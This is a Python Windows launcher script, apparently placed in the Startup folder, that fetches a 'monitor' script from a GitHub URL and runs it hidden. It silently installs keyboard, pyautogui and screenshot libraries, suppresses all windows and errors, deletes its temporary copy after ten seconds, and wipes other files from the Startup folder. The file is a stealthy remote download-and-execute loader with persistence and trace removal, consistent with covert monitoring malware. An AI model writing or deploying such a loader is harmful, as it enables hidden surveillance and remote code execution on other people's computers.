# github_launcher.pyw - Clean launcher that runs from GitHub
import os
import sys
import subprocess
import urllib.request
import tempfile
import time

def run_monitor():
    """Download and run monitor script from GitHub"""
    try:
        # GitHub URL
        SCRIPT_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/monitor_script.py"
        
        # Create temp folder for this session
        session_id = str(int(time.time()))
        temp_dir = os.path.join(tempfile.gettempdir(), f"monitor_{session_id}")
        os.makedirs(temp_dir, exist_ok=True)
        
        temp_script = os.path.join(temp_dir, "monitor.py")
        
        # Download the script
        response = urllib.request.urlopen(SCRIPT_URL, timeout=10)
        script_code = response.read().decode('utf-8')
        
        # Save to temp folder
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        # Add auto-install at beginning
        with open(temp_script, 'r+') as f:
            content = f.read()
            f.seek(0, 0)
            
            auto_install = '''# Auto-install dependencies
import sys, subprocess, importlib.util

def install(pkg):
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"],
                      creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

required = ["pywin32", "pyautogui", "keyboard", "requests", "pillow"]
for pkg in required:
    try:
        __import__(pkg if pkg != "pillow" else "PIL")
    except ImportError:
        install(pkg)

'''
            f.write(auto_install + content)
        
        # Run the script (completely hidden)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            cwd=temp_dir
        )
        
        # Schedule cleanup after 10 seconds
        time.sleep(10)
        try:
            # Try to delete temp folder
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass
        
        return True
        
    except Exception as e:
        # Silent failure - no output
        return False

def keep_startup_clean():
    """Ensure startup folder only contains launcher files"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        # Files that should remain
        allowed_files = {'Startup.pyw', 'github_launcher.pyw'}
        
        for filename in os.listdir(startup_folder):
            filepath = os.path.join(startup_folder, filename)
            
            # Delete any .py/.log files that aren't launchers
            if filename.endswith(('.py', '.pyw', '.log', '.txt', '.json')):
                if filename not in allowed_files:
                    try:
                        os.remove(filepath)
                    except:
                        pass
        
        # Delete __pycache__ folders
        for root, dirs, files in os.walk(startup_folder, topdown=False):
            for dir_name in dirs:
                if dir_name == '__pycache__':
                    try:
                        import shutil
                        shutil.rmtree(os.path.join(root, dir_name), ignore_errors=True)
                    except:
                        pass
    except:
        pass

def main():
    """Main launcher function"""
    # Hide console (if running as .pyw)
    try:
        import win32gui
        import win32con
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except:
        pass
    
    # Ensure startup folder is clean
    keep_startup_clean()
    
    # Initial delay for network
    time.sleep(5)
    
    # Run monitor from GitHub
    run_monitor()
    
    # Keep launcher alive but idle
    while True:
        time.sleep(3600)  # Check every hour

if __name__ == "__main__":
    main()
